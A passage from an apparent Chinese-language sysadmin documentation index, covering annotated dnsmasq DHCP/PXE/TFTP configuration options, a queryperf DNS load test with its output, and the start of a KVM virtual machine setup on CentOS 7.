BOOTP \u9009\u9879\uff0c\n# &lt;servername&gt; &lt;server address&gt; \u53ef\u9009\uff0c\n# \u5982\u679c\u672a\u8bbe\u7f6e\u670d\u52a1\u5668\u540d\u79f0\u5c06\u8bbe\u4e3a\u7a7a\uff0c\u670d\u52a1\u5668\u5730\u5740\u8bbe\u4e3a dnsmasq \u7684 IP \u5730\u5740\u3002\n# \u5982\u679c\u6307\u5b9a\u4e86\u591a\u4e2a tag:&lt;tag&gt; \u5fc5\u987b\u540c\u65f6\u5339\u914d\u624d\u884c\u3002\n# \u5982\u679c\u6307\u5b9a &lt;tftp_servername&gt; \u5c06\u6309\u7167 /etc/hosts \u4e2d\u5bf9\u5e94\u7684 IP \u5730\u5740\u8fdb\u884c\u8f6e\u8be2\u8d1f\u8f7d\u5747\u8861\u3002  \n#dhcp-boot=[tag:&lt;tag&gt;,]&lt;filename&gt;,[&lt;servername&gt;[,&lt;server address&gt;|&lt;tftp_servername&gt;]]\n# \u6839\u636e\u4e0d\u540c\u7684\u7c7b\u578b\u4f7f\u7528\u4e0d\u540c\u7684\u9009\u9879\u3002\n# \u4f7f\u7528\u793a\u4f8b\uff1a\n#        dhcp-match=set:EFI_x86-64,option:client-arch,9\n#        dhcp-boot=tag:EFI_x86-64,uefi/grubx64.efi\n#        #dhcp-match=set:EFI_Xscale,option:client-arch,8\n#        #dhcp-boot=tag:EFI_Xscale,uefi/grubx64.efi\n#        #dhcp-match=set:EFI_BC,option:client-arch,7\n#        #dhcp-boot=tag:EFI_BC,uefi/grubx64.efi\n#        #dhcp-match=set:EFI_IA32,option:client-arch,6\n#        #dhcp-boot=tag:EFI_IA32,uefi/grubx64.efi\n#        #dhcp-match=set:Intel_Lean_Client,option:client-arch,5\n#        #dhcp-boot=tag:Intel_Lean_Client,uefi/grubx64.efi\n#        #dhcp-match=set:Arc_x86,option:client-arch,4\n#        #dhcp-boot=tag:Arc_x86,uefi/grubx64.efi\n#        #dhcp-match=set:DEC_Alpha,option:client-arch,3\n#        #dhcp-boot=tag:DEC_Alpha,uefi/grubx64.efi\n#        #dhcp-match=set:EFI_Itanium,option:client-arch,2\n#        #dhcp-boot=tag:EFI_Itanium,uefi/grubx64.efi\n#        #dhcp-match=set:NEC/PC98,option:client-arch,1\n#        #dhcp-boot=tag:NEC/PC98,uefi/grubx64.efi\n#        dhcp-match=set:Intel_x86PC,option:client-arch,0\n#        dhcp-boot=tag:Intel_x86PC,pxelinux.0\n\n##############################################################################\n# DHCP \u4f7f\u7528\u5ba2\u6237\u7aef\u7684 MAC \u5730\u5740\u7684\u54c8\u5e0c\u503c\u4e3a\u5ba2\u6237\u7aef\u5206\u914d IP \u5730\u5740\uff0c\n# \u901a\u5e38\u60c5\u51b5\u4e0b\u5373\u4f7f\u5ba2\u6237\u7aef\u4f7f\u81ea\u5df1\u7684\u79df\u7ea6\u5230\u671f\uff0c\u5ba2\u6237\u7aef\u7684 IP \u5730\u5740\u4ecd\u5c06\u957f\u671f\u4fdd\u6301\u7a33\u5b9a\u3002\n# \u5728\u9ed8\u8ba4\u6a21\u5f0f\u4e0b\uff0cIP \u5730\u5740\u662f\u968f\u673a\u5206\u914d\u7684\u3002\n# \u542f\u7528 dhcp-sequential-ip \u9009\u9879\u5c06\u6309\u987a\u5e8f\u5206\u914d IP \u5730\u5740\u3002\n# \u5728\u987a\u5e8f\u5206\u914d\u6a21\u5f0f\u4e0b\uff0c\u5ba2\u6237\u7aef\u4f7f\u79df\u7ea6\u5230\u671f\u66f4\u50cf\u662f\u4ec5\u4ec5\u79fb\u52a8\u4e00\u4e0b IP \u5730\u5740\u3002\n# \u5728\u901a\u5e38\u60c5\u51b5\u4e0b\u4e0d\u5efa\u8bae\u4f7f\u7528\u8fd9\u79cd\u65b9\u5f0f\u3002\n#dhcp-sequential-ip\n\n##############################################################################\n# \u591a\u6570\u60c5\u51b5\u4e0b\u6211\u4eec\u4f7f\u7528 PXE\uff0c\u53ea\u662f\u7b80\u5355\u7684\u5141\u8bb8 PXE \u5ba2\u6237\u7aef\u83b7\u53d6 IP \u5730\u5740\uff0c\n# \u7136\u540e PXE \u5ba2\u6237\u7aef\u4e0b\u8f7d dhcp-boot \u9009\u9879\u6307\u5b9a\u7684\u6587\u4ef6\u5e76\u6267\u884c\uff0c\u4e5f\u5c31\u662f BOOTP \u7684\u65b9\u5f0f\u3002\n# \u7136\u800c\u5728\u6709\u9002\u5f53\u914d\u7f6e\u7684 DHCP \u670d\u52a1\u5668\u652f\u6301\u7684\u60c5\u51b5\u4e0b\uff0cPXE \u7cfb\u7edf\u80fd\u591f\u5b9e\u73b0\u66f4\u590d\u6742\u7684\u529f\u80fd\u3002\n# pxe-service \u9009\u9879\u53ef\u6307\u5b9a PXE \u73af\u5883\u7684\u542f\u52a8\u83dc\u5355\u3002\n# \u4e3a\u4e0d\u540c\u7684\u7c7b\u578b\u7cfb\u7edf\u8bbe\u5b9a\u4e0d\u540c\u7684\u542f\u52a8\u83dc\u5355\uff0c\u5e76\u4e14\u8986\u76d6 dhcp-boot \u9009\u9879\u3002\n# &lt;CSA&gt; \u4e3a\u5ba2\u6237\u7aef\u7cfb\u7edf\u7c7b\u578b\uff1ax86PC, PC98, IA64_EFI, Alpha, Arc_x86, Intel_Lean_Client, \n# IA32_EFI, X86-64_EFI, Xscale_EFI, BC_EFI, ARM32_EFI \u548c ARM64_EFI\uff0c\u5176\u4ed6\u7c7b\u578b\u53ef\u80fd\u4e3a\u4e00\u4e2a\u6574\u6570\u3002\n# &lt;basename&gt; \u5f15\u5bfc PXE \u5ba2\u6237\u7aef\u4f7f\u7528 tftp \u4ece &lt;server address&gt; \u6216\u8005 &lt;server_name&gt; \u4e0b\u8f7d\u6587\u4ef6\u3002\n#     \u6ce8\u610f\uff1a\"layer\" \u540e\u7f00 (\u901a\u5e38\u662f \".0\") \u7531 PXE \u63d0\u4f9b\uff0c\u4e5f\u5c31\u662f PXE \u5ba2\u6237\u7aef\u9ed8\u8ba4\u5728\u6587\u4ef6\u540d\u9644\u52a0 .0 \u540e\u7f00\u3002\n#     \u793a\u4f8b\uff1apxe-service=x86PC, \"Install Linux\", pxelinux         \uff08\u8bfb\u53d6 pxelinux.0 \u6587\u4ef6\u5e76\u6267\u884c\uff09\n#           pxe-service=x86PC, \"Install Linux\", pxelinux, 1.2.3.4\uff08\u4e0d\u9002\u7528\u4e8e\u8001\u7684PXE\uff09\n#     &lt;bootservicetype&gt; \u6574\u6570\uff0cPXE \u5ba2\u6237\u7aef\u5c06\u901a\u8fc7\u5e7f\u64ad\u6216\u8005\u901a\u8fc7 &lt;server address&gt; \n#           \u6216\u8005 &lt;server_name&gt; \u641c\u7d22\u5bf9\u5e94\u7c7b\u578b\u7684\u9002\u5408\u7684\u542f\u52a8\u670d\u52a1\u3002\u3002\n#     \u793a\u4f8b\uff1apxe-service=x86PC, \"Install windows from RIS server\", 1\n#           pxe-service=x86PC, \"Install windows from RIS server\", 1, 1.2.3.4\n#     \u672a\u6307\u5b9a &lt;basename&gt;\u3001&lt;bootservicetype&gt; \u6216\u8005 &lt;bootservicetype&gt; \u4e3a \u201c0\u201d\uff0c\u5c06\u4ece\u672c\u5730\u542f\u52a8\u3002\n#     \u793a\u4f8b\uff1apxe-service=x86PC, \"Boot from local disk\"\n#           pxe-service=x86PC, \"Boot from local disk\", 0\n# \u5982\u679c\u6307\u5b9a &lt;server_name&gt; \u5c06\u6309\u7167 /etc/hosts \u4e2d\u5bf9\u5e94\u7684 IP \u5730\u5740\u8fdb\u884c\u8f6e\u8be2\u8d1f\u8f7d\u5747\u8861\u3002  \n#pxe-service=[tag:&lt;tag&gt;,]&lt;CSA&gt;,&lt;menu text&gt;[,&lt;basename&gt;|&lt;bootservicetype&gt;][,&lt;server address&gt;|&lt;server_name&gt;]\n# \u5728 PXE \u542f\u52a8\u540e\u5f39\u51fa\u63d0\u793a\uff0c&lt;prompt&gt; \u4e3a\u63d0\u793a\u5185\u5bb9\uff0c&lt;timeout&gt; \u4e3a\u8d85\u65f6\u65f6\u95f4\uff0c\u4e3a 0 \u5219\u7acb\u5373\u6267\u884c\u3002\n# \u5982\u679c\u672a\u6307\u5b9a\u6b64\u9009\u9879\uff0c\u5728\u6709\u591a\u4e2a\u542f\u52a8\u9009\u9879\u7684\u60c5\u51b5\u4e0b\u7b49\u5f85\u7528\u6237\u9009\u62e9\uff0c\u4e0d\u4f1a\u8d85\u65f6\u3002\n#pxe-prompt=[tag:&lt;tag&gt;,]&lt;prompt&gt;[,&lt;timeout&gt;]\n# \u6839\u636e\u4e0d\u540c\u7684\u7c7b\u578b\u4f7f\u7528\u4e0d\u540c\u7684\u83dc\u5355\uff0c\u4f7f\u7528\u793a\u4f8b\uff1a\n#        #pxe-prompt=\"What system shall I netboot?\", 120\n#        # or with timeout before first available action is taken:\n#        pxe-prompt=\"Press F8 or Enter key for menu.\", 60\n#        pxe-service=x86PC, \"Now in x86PC (BIOS mode), boot from local\", 0\n#        pxe-service=x86PC, \"Now in x86PC (BIOS mode)\", pxelinux\n#        pxe-service=PC98, \"Now in PC98 mode\", PC98\n#        pxe-service=IA64_EFI, \"Now in IA64_EFI mode\", IA64_EFI\n#        pxe-service=Alpha, \"Now in Alpha mode\", Alpha\n#        pxe-service=Arc_x86, \"Now in Arc_x86 mode\", Arc_x86\n#        pxe-service=Intel_Lean_Client, \"Now in Intel_Lean_Client mode\", Intel_Lean_Client\n#        pxe-service=IA32_EFI, \"Now in IA32_EFI mode\", IA32_EFI\n#        pxe-service=X86-64_EFI, \"Now in X86-64_EFI (UEFI mode), boot from local\", 0\n#        pxe-service=X86-64_EFI, \"Now in X86-64_EFI (UEFI mode)\", grub/grub-x86_64.efi\n#        pxe-service=Xscale_EFI, \"Now in Xscale_EFI mode\", Xscale_EFI\n#        pxe-service=BC_EFI, \"Now in BC_EFI mode\", BC_EFI\n#        # CentOS7 \u7cfb\u7edf\u4e0d\u652f\u6301\u4e0b\u5217\u4e24\u4e2a\u9009\u9879\n#        #pxe-service=ARM32_EFI,\"Now in ARM32_EFI mode\",ARM32_EFI\n#        #pxe-service=ARM64_EFI,\"Now in ARM64_EFI mode\",ARM64_EFI\n\n##############################################################################\n# \u9ed8\u8ba4\u4e3a150\uff0c\u5373\u6700\u591a\u5206\u914d150\u4e2aip\u5730\u5740\u51fa\u53bb\uff0c\u6700\u59271000\u4e2aip\n#dhcp-lease-max=150\n# (IPv4 only) \u6307\u5b9aDHCP\u7aef\u53e3\uff0c\u9ed8\u8ba4\u4e3a67\u548c68\u3002\u5982\u679c\u4e0d\u6307\u5b9a\u5219\u4e3a1067\u548c1068\uff0c\u5355\u6307\u5b9a\u4e00\u4e2a\uff0c\u7b2c\u4e8c\u4e2a\u52a01\n#dhcp-alternate-port[=&lt;server port&gt;[,&lt;client port&gt;]]\n# \u8c28\u614e\u4f7f\u7528\u6b64\u9009\u9879\uff0c\u907f\u514d IP \u5730\u5740\u6d6a\u8d39\u3002(IPv4 only) \u5141\u8bb8\u52a8\u6001\u5206\u914d IP \u5730\u5740\u7ed9 BOOTP \u5ba2\u6237\u7aef\u3002\n# \u6ce8\u610f\uff1aBOOTP \u5ba2\u6237\u7aef\u83b7\u53d6\u7684 IP \u5730\u5740\u662f\u6c38\u4e45\u7684\uff0c\u5c06\u65e0\u6cd5\u518d\u6b21\u5206\u914d\u7ed9\u5176\u4ed6\u5ba2\u6237\u7aef\u3002\n#bootp-dynamic[=&lt;network-id&gt;[,&lt;network-id&gt;]]\n# \u8c28\u614e\u4f7f\u7528\u6b64\u9009\u9879\u3002\n# \u9ed8\u8ba4\u60c5\u51b5\u4e0b DHCP \u670d\u52a1\u5668\u4f7f\u7528 ping \u7684\u65b9\u5f0f\u8fdb\u884c\u786e\u4fdd IP \u672a\u88ab\u4f7f\u7528\u7684\u60c5\u51b5\u4e0b\u5c06 IP \u5730\u5740\u5206\u914d\u51fa\u53bb\u3002# \u542f\u7528\u6b64\u9009\u9879\u5c06\u4e0d\u4f7f\u7528 ping \u8fdb\u884c\u786e\u8ba4\u3002\n#no-ping\n\n##############################################################################\n# \u8bb0\u5f55\u989d\u5916\u7684 dhcp \u65e5\u5fd7\uff0c\u8bb0\u5f55\u6240\u6709\u53d1\u9001\u7ed9 DHCP \u5ba2\u6237\u7aef\u7684\u9009\u9879\uff08option\uff09\u4ee5\u53ca\u6807\u7b7e\uff08tag\uff09\u4fe1\u606f\n#log-dhcp\n# \u7981\u6b62\u8bb0\u5f55\u65e5\u5e38\u64cd\u4f5c\u65e5\u5fd7\uff0c\u9519\u8bef\u65e5\u5fd7\u4ecd\u7136\u8bb0\u5f55\u3002\u542f\u7528 log-dhcp \u5c06\u8986\u76d6\u4e0b\u5217\u9009\u9879\u3002\n#quiet-dhcp\n#quiet-dhcp6\n#quiet-ra\n# \u4fee\u6539 DHCP \u9ed8\u8ba4\u79df\u7ea6\u6587\u4ef6\u8def\u5f84\uff0c\u9ed8\u8ba4\u60c5\u51b5\u4e0b\u65e0\u9700\u4fee\u6539\n#dhcp-leasefile=/var/lib/dnsmasq/dnsmasq.leases\n# (IPv6 only)\n#dhcp-duid=&lt;enterprise-id&gt;,&lt;uid&gt;\n\n##############################################################################\n#dhcp-script=&lt;path&gt;\n#dhcp-luascript=&lt;path&gt;\n#dhcp-scriptuser=root\n#script-arp\n#leasefile-ro\n#bridge-interface=&lt;interface&gt;,&lt;alias&gt;[,&lt;alias&gt;]\n\n##############################################################################\n# \u7ed9 DHCP \u670d\u52a1\u5668\u6307\u5b9a domain \u57df\u540d\u4fe1\u606f\uff0c\u4e5f\u53ef\u4ee5\u7ed9\u5bf9\u5e94\u7684 IP \u5730\u5740\u6c60\u6307\u5b9a\u57df\u540d\n#     \u76f4\u63a5\u6307\u5b9a\u57df\u540d\n#     \u793a\u4f8b\uff1adomain=thekelleys.org.uk\n#     \u5b50\u7f51\u5bf9\u5e94\u7684\u57df\u540d\n#     \u793a\u4f8b\uff1adomain=wireless.thekelleys.org.uk,192.168.2.0/24\n#     ip\u8303\u56f4\u5bf9\u5e94\u7684\u57df\u540d\n#     \u793a\u4f8b\uff1adomain=reserved.thekelleys.org.uk,192.68.3.100,192.168.3.200\n#domain=&lt;domain&gt;[,&lt;address range&gt;[,local]]\n# \u5728\u9ed8\u8ba4\u60c5\u51b5\u4e0b dnsmasq \u63d2\u5165\u666e\u901a\u7684\u5ba2\u6237\u7aef\u4e3b\u673a\u540d\u5230 DNS \u4e2d\u3002\n# \u5728\u8fd9\u79cd\u60c5\u51b5\u4e0b\u4e3b\u673a\u540d\u5fc5\u987b\u552f\u4e00\uff0c\u5373\u4f7f\u4e24\u4e2a\u5ba2\u6237\u7aef\u5177\u6709\u4e0d\u540c\u7684\u57df\u540d\u540e\u7f00\u3002\n# \u5982\u679c\u7b2c\u4e8c\u4e2a\u5ba2\u6237\u7aef\u4f7f\u7528\u4e86\u76f8\u540c\u7684\u4e3b\u673a\u540d\uff0cDNS \u67e5\u8be2\u5c06\u81ea\u52a8\u66f4\u65b0\u4e3a\u7b2c\u4e8c\u4e2a\u5ba2\u6237\u7aef\u7684 IP \u5730\u5740\u3002\n# \u5982\u679c\u8bbe\u7f6e\u4e86 dhcp-fqdn \u9009\u9879\uff0c\u666e\u901a\u7684\u4e3b\u673a\u540d\u5c06\u4e0d\u518d\u63d2\u5165\u5230 DNS \u4e2d\u53bb\uff0c\n# \u4ec5\u5141\u8bb8\u5408\u683c\u7684\u5177\u6709\u57df\u540d\u540e\u7f00\u7684\u4e3b\u673a\u540d\u63d2\u5165\u5230 DNS \u670d\u52a1\u5668\u4e2d\u3002\n# \u6307\u5b9a\u6b64\u9009\u9879\u9700\u540c\u65f6\u6307\u5b9a\u4e0d\u542b &lt;address range&gt; \u5730\u5740\u8303\u56f4\u7684 domain \u9009\u9879\u3002\n#dhcp-fqdn\n# \u901a\u5e38\u60c5\u51b5\u4e0b\u5206\u914d DHCP \u79df\u7ea6\u540e\uff0cdnsmasq \u8bbe\u7f6e FQDN \u9009\u9879\u544a\u8bc9\u5ba2\u6237\u7aef\u4e0d\u8981\u5c1d\u8bd5 DDNS \u66f4\u65b0\u4e3b\u673a\u540d\u4e0e IP \u5730\u5740\u3002\n# \u8fd9\u662f\u56e0\u4e3a  name-IP \u5df2\u81ea\u52a8\u6dfb\u52a0\u5230 dnsmasq \u7684 DNS \u89c6\u56fe\u4e2d\u7684\u3002\n# \u8bbe\u7f6e\u6b64\u9009\u9879\u5c06\u5141\u8bb8\u5ba2\u6237\u7aef DDNS \u66f4\u65b0\uff0c\n# \u5728 windows \u4e0b\u5141\u8bb8\u5ba2\u6237\u7aef\u66f4\u65b0 windows AD \u670d\u52a1\u5668\u662f\u975e\u5e38\u6709\u7528\u7684\u3002\n# \u53c2\u770b  RFC 4702 \u3002\n#dhcp-client-update\n#enable-ra\n#ra-param=&lt;interface&gt;,[high|low],[[&lt;ra-interval&gt;],&lt;router lifetime&gt;]\n\n##############################################################################\n#\n#        TFTP \u9009\u9879\n#\n##############################################################################\n# \u5bf9\u4e8e\u7edd\u5927\u591a\u6570\u7684\u914d\u7f6e\uff0c\u4ec5\u9700\u6307\u5b9a enable-tftp \u548c tftp-root \u9009\u9879\u5373\u53ef\u3002\n# \u662f\u5426\u542f\u7528\u5185\u7f6e\u7684 tftp \u670d\u52a1\u5668\uff0c\u53ef\u4ee5\u6307\u5b9a\u591a\u4e2a\u9017\u5206\u9694\u7684\u7f51\u7edc\u63a5\u53e3\n#enable-tftp[=&lt;interface&gt;[,&lt;interface&gt;]]\n#enable-tftp\n#enable-tftp=enp3s0,lo\n# \u6307\u5b9a tftp \u7684\u6839\u76ee\u5f55\uff0c\u4e5f\u5c31\u662f\u5bfb\u627e\u4f20\u8f93\u6587\u4ef6\u65f6\u4f7f\u7528\u7684\u76f8\u5bf9\u8def\u5f84\uff0c\u53ef\u4ee5\u9644\u52a0\u63a5\u53e3\uff0c\n#tftp-root=&lt;directory&gt;[,&lt;interface&gt;]\n#tftp-root=/var/lib/tftpboot/\n# \u5982\u679c\u53d6\u6d88\u6ce8\u91ca\uff0c\u90a3\u4e48\u5373\u4f7f\u6307\u5b9a\u7684 tftp-root \u65e0\u6cd5\u8bbf\u95ee\uff0c\u4ecd\u7136\u542f\u52a8 tftp \u670d\u52a1\u3002\n#tftp-no-fail\n# \u9644\u52a0\u5ba2\u6237\u7aef\u7684 IP \u5730\u5740\u4f5c\u4e3a\u6587\u4ef6\u8def\u5f84\u3002\u6b64\u9009\u9879\u4ec5\u5728\u6b63\u786e\u8bbe\u7f6e\u4e86 tftp-root \u7684\u60c5\u51b5\u4e0b\u53ef\u7528\uff0c\n# \u793a\u4f8b\uff1a\u5982\u679c tftp-root=/tftp\uff0c\u5ba2\u6237\u7aef\u4e3a 192.168.1.15 \u8bf7\u6c42 myfile.txt \u6587\u4ef6\u65f6\uff0c\n# \u5c06\u4f18\u5148\u8bf7\u6c42 /tftp/192.168.1.15/myfile.txt \u6587\u4ef6\uff0c \u5176\u6b21\u662f /tftp/myfile.txt \u6587\u4ef6\u3002\n# \u611f\u89c9\u6ca1\u4ec0\u4e48\u7528\u3002\n#tftp-unique-root\n# \u542f\u7528\u5b89\u5168\u6a21\u5f0f\uff0c\u542f\u7528\u6b64\u9009\u9879\uff0c\u4ec5\u5141\u8bb8 tftp \u8fdb\u7a0b\u8bbf\u95ee\u5c5e\u4e3b\u4e3a\u81ea\u5df1\u7684\u6587\u4ef6\u3002\n# \u4e0d\u542f\u7528\u6b64\u9009\u9879\uff0c\u5141\u8bb8\u8bbf\u95ee\u6240\u6709 tftp \u8fdb\u7a0b\u5c5e\u4e3b\u53ef\u8bfb\u53d6\u7684\u6587\u4ef6\u3002\n# \u5982\u679c dnsmasq \u662f\u4ee5 root \u7528\u6237\u8fd0\u884c\uff0ctftp-secure \u9009\u9879\u5c06\u5141\u8bb8\u8bbf\u95ee\u5168\u5c40\u53ef\u8bfb\u7684\u6587\u4ef6\u3002\n# \u4e00\u822c\u60c5\u51b5\u4e0b\u4e0d\u63a8\u8350\u4ee5 root \u7528\u6237\u8fd0\u884c dnsmasq\u3002\n# \u5728\u6307\u5b9a\u4e86 tftp-root \u7684\u60c5\u51b5\u4e0b\u5e76\u4e0d\u662f\u5f88\u91cd\u8981\u3002\n#tftp-secure\n# \u5c06\u6240\u6709\u6587\u4ef6\u8bf7\u6c42\u8f6c\u6362\u4e3a\u5c0f\u5199\u3002\u5bf9\u4e8e Windows \u5ba2\u6237\u7aef\u6765\u8bf4\u975e\u5e38\u6709\u7528\uff0c\u5efa\u8bae\u5f00\u542f\u6b64\u9879\u3002\n# \u6ce8\u610f\uff1adnsmasq \u7684 TFTP \u670d\u52a1\u5668\u603b\u662f\u5c06\u6587\u4ef6\u8def\u5f84\u4e2d\u7684\u201c\\\u201d\u8f6c\u6362\u4e3a\u201c/\u201d\u3002\n#tftp-lowercase\n# \u5141\u8bb8\u6700\u5927\u7684\u8fde\u63a5\u6570\uff0c\u9ed8\u8ba4\u4e3a 50 \u3002\n# \u5982\u679c\u5c06\u8fde\u63a5\u6570\u8bbe\u7f6e\u7684\u5f88\u5927\uff0c\u9700\u6ce8\u610f\u6bcf\u4e2a\u8fdb\u7a0b\u7684\u6700\u5927\u6587\u4ef6\u63cf\u8ff0\u7b26\u9650\u5236\uff0c\u8be6\u89c1\u6587\u6863\u624b\u518c\u3002\n#tftp-max=&lt;connections&gt;\n#tftp-max=50\n# \u8bbe\u7f6e\u4f20\u8f93\u65f6\u7684 MTU \u503c\uff0c\u5efa\u8bae\u4e0d\u8bbe\u7f6e\u6216\u6309\u9700\u8bbe\u7f6e\u3002\n# \u5982\u679c\u8bbe\u5b9a\u7684\u503c\u5927\u4e8e\u7f51\u7edc\u63a5\u53e3\u7684 MTU \u503c\uff0c\u5c06\u6309\u7167\u7f51\u7edc\u63a5\u53e3\u7684 MTU \u503c\u81ea\u52a8\u5206\u7247\u4f20\u8f93\uff08\u4e0d\u63a8\u8350\uff09\u3002\n#tftp-mtu=&lt;mtu size&gt;\n# \u505c\u6b62 tftp \u670d\u52a1\u5668\u4e0e\u5ba2\u6237\u7aef\u534f\u5546 \"blocksize\" \u9009\u9879\u3002\u542f\u7528\u540e\uff0c\u9632\u6b62\u4e00\u4e9b\u53e4\u602a\u7684\u5ba2\u6237\u7aef\u51fa\u95ee\u9898\u3002\n#tftp-no-blocksize\n# \u6307\u5b9a tftp \u7684\u8fde\u63a5\u7aef\u53e3\u7684\u8303\u56f4\uff0c\u65b9\u4fbf\u9632\u706b\u5899\u90e8\u7f72\u3002\n# tftp \u4fa6\u542c\u5728 69/udp \uff0c\u8fde\u63a5\u7aef\u53e3\u9ed8\u8ba4\u662f\u7531\u7cfb\u7edf\u81ea\u52a8\u5206\u914d\u7684\uff0c\n# \u975e root \u7528\u6237\u8fd0\u884c\u65f6\u6307\u5b9a\u7684\u8fde\u63a5\u7aef\u53e3\u53f7\u9700\u5927\u4e8e 1025 \u6700\u5927 65535\u3002\n#tftp-port-range=&lt;start&gt;,&lt;end&gt;\n\n###############################################################################\n#conf-dir=&lt;directory&gt;[,&lt;file-extension&gt;......]\n#conf-file=/etc/dnsmasq.more.conf\nconf-dir=/etc/dnsmasq.d\n#servers-file=&lt;file&gt;\n</code></pre>"},{"location":"daily/41-dnsmasq/#_2","title":"\u4e8c\u3001\u538b\u6d4b","text":""},{"location":"daily/41-dnsmasq/#21","title":"2.1 \u5b89\u88c5","text":"<pre><code>git clone https://gitlab.isc.org/isc-projects/queryperf.git\ncd queryperf\n./configure\nmake\ncp queryperf ~/bin/\n</code></pre>"},{"location":"daily/41-dnsmasq/#22-help","title":"2.2 HELP","text":"<pre><code> queryperf --help\n\nDNS Query Performance Testing Tool\nVersion: $Id: queryperf.c,v 1.12 2007/09/05 07:36:04 marka Exp $\n\nqueryperf: invalid option -- '-'\nInvalid option: --\n\nUsage: queryperf [-d datafile] [-s server_addr] [-p port] [-q num_queries]\n                 [-b bufsize] [-t timeout] [-n] [-l limit] [-f family] [-1]\n                 [-i interval] [-r arraysize] [-u unit] [-H histfile]\n                 [-T qps] [-e] [-D] [-R] [-c] [-v] [-h]\n  -d specifies the input data file (default: stdin)\n  -s sets the server to query (default: 127.0.0.1)\n  -p sets the port on which to query the server (default: 53)\n  -q specifies the maximum number of queries outstanding (default: 20)\n  -t specifies the timeout for query completion in seconds (default: 5)\n  -n causes configuration changes to be ignored\n  -l specifies how a limit for how long to run tests in seconds (no default)\n  -1 run through input only once (default: multiple iff limit given)\n  -b set input/output buffer size in kilobytes (default: 32 k)\n  -i specifies interval of intermediate outputs in seconds (default: 0=none)\n  -f specify address family of DNS transport, inet or inet6 (default: any)\n  -r set RTT statistics array size (default: 50000)\n  -u set RTT statistics time unit in usec (default: 100)\n  -H specifies RTT histogram data file (default: none)\n  -T specify the target qps (default: 0=unspecified)\n  -e enable EDNS 0\n  -D set the DNSSEC OK bit (implies EDNS)\n  -R disable recursion\n  -c print the number of packets with each rcode\n  -v verbose: report the RCODE of each response on stdout\n  -h print this usage\n</code></pre>"},{"location":"daily/41-dnsmasq/#23","title":"2.3 \u4f7f\u7528","text":"<pre><code>for i in {a..z};do echo \"$i.8ops.top A\" &gt;&gt; datafile;done\n\n~# queryperf -d datafile -s 10.101.11.105\nDNS Query Performance Testing Tool\nVersion: $Id: queryperf.c,v 1.12 2007/09/05 07:36:04 marka Exp $\n\n[Status] Processing input data\n[Status] Sending queries (beginning with 10.101.11.105)\n[Status] Testing complete\n\nStatistics:\n\n  Parse input file:     once\n  Ended due to:         reaching end of file\n\n  Queries sent:         10026 queries\n  Queries completed:    10026 queries\n  Queries lost:         0 queries\n  Queries delayed(?):   0 queries\n\n  RTT max:          16.616721 sec\n  RTT min:              0.000185 sec\n  RTT average:          0.063880 sec\n  RTT std deviation:    0.096947 sec\n  RTT out of range:     16 queries\n\n  Percentage completed: 100.00%\n  Percentage lost:        0.00%\n\n  Started at:           Fri Jan  6 17:16:29 2023\n  Finished at:          Fri Jan  6 17:17:18 2023\n  Ran for:              49.019564 seconds\n\n  Queries per second:   204.530583 qps\n</code></pre>"},{"location":"daily/42-kvm/","title":"kvm","text":""},{"location":"daily/42-kvm/#_1","title":"\u4e00\u3001\u5b89\u88c5\u8fc7\u7a0b","text":""},{"location":"daily/42-kvm/#11","title":"1.1 \u5b89\u88c5","text":"<pre><code># CentOS Linux release 7.5.1804 (Core)\n\negrep 'vmx|svm' /proc/cpuinfo\n\nyum install -y -q \\\n    qemu-kvm qemu-img \\\n    virt-manager libvirt libvirt-python python-virtinst libvirt-client \\\n    virt-install virt-viewer\n\nlsmod | grep -i kvm\n\nbrctl show\n\n# virsh net-list\n\nsystemctl start libvirtd\nsystemctl enable libvirtd\nsystemctl is-enabled libvirtd\n\ncd /etc/sysconfig/network-scripts/\n# \u7f16\u8f91 ifcfg-em2 &amp; ifcfg-br0\ncat &gt; ifcfg-br0 &lt;&lt;EOF\nTYPE=Bridge\nBOOTPROTO=static\nNAME=br0\nDEVICE=br0\nONBOOT=yes\nIPADDR=10.1.2.109\nPREFIX=24\nEOF\n\ncat &gt; ifcfg-em2 &lt;&lt;EOF\nTYPE=Ethernet\nBOOTPROTO=none\nNAME=em2\nDEVICE=em2\nONBOOT=yes\nBRIDGE=br0\nEOF\n\n# \u6fc0\u6d3b\u7f51\u5361\nip l set br0 up # ifup br0\nip l set em2 up # ifup em2\n\n# systemctl restart NetworkManager\nsystemctl restart network\n\n# \u91ca\u653e\u591a\u4f59\u7684\u6865\u63a5\u548c\u7f51\u7edc\u63a5\u53e3\nip l set dev virbr0-nic down\nbrctl delif virbr0 virbr0-nic\nbrctl delbr virbr0\n\nip l set dev virbr0 down\nip l del virbr0-nic\n\n# METHOD VNC\nvirt-install --name UAT-BIGDATA-000 \\\n    --virt-type kvm \\\n    --ram=8192 \\\n    --vcpus=2 \\\n    --cdrom=/data/backup/CentOS-7-x86_64-DVD-2009.iso \\\n    --disk path=/data/lib/kvm/UAT-BIGDATA-001/UAT-BIGDATA-000-SDA.raw \\\n    --network bridge=br0 \\\n    --graphics vnc,listen=0.0.0.0 \\\n    --noautoconsole\n\nvirt-install --name UAT-BIGDATA-000 \\\n    --virt-type kvm  \\\n    --ram 4096 \\\n    --vcpus 2 \\\n    --boot hd \\\n    --disk path=/data/lib/kvm/UAT-BIGDATA-001/UAT-BIGDATA-000-SDA.qcow2 \\\n    --mac=52:54:0A:01:02:32 \\\n    --network bridge=br1 \\\n    --graphics vnc,listen=0.0.0.0 \\\n    --noautoconsole\n\n# METHOD Console\nmkdir -p /data/lib/kvm/UAT-BIGDATA-000\nqemu-img create -f qcow2 /data/lib/kvm/UAT-BIGDATA-000-SDA.img 50G\n\nvirt-install --name UAT-BIGDATA-000 \\\n    --ram=8192 \\\n    --vcpus=2 \\\n    --location=/data/backup/CentOS-7-x86_64-DVD-2009.iso \\\n    --disk path=/data/lib/kvm/UAT-BIGDATA-000-SDA.img \\\n    --network bridge=br0,mac=52:54:0A:01:02:32 \\\n    --graphics=none \\\n    --console=pty,target_type=serial \\\n    --extra-args=\"console=ttyS0\"\n\nvirsh autostart UAT-BIGDATA-000\n\n# MAC \u5730\u5740\u751f\u6210\u7b56\u7565\necho 10.1.2.50 | \\\n    awk -F'.' '{\n        printf(\"52:54\");\n        for(i=1;i&lt;NF+1;i++){\n            if($i&lt;=10){printf(\":0%X\",$i)}\n            else{printf(\":%X\",$i)}}\n    printf(\"\\n\")}'\n\n# \u5e38\u7528\u547d\u4ee4\nvirsh list --all        \u67e5\u770b\u6240\u6709\u865a\u62df\u673a\u72b6\u6001\nvirsh start vm_name     \u5f00\u673a \nvirsh shutdown vm_name  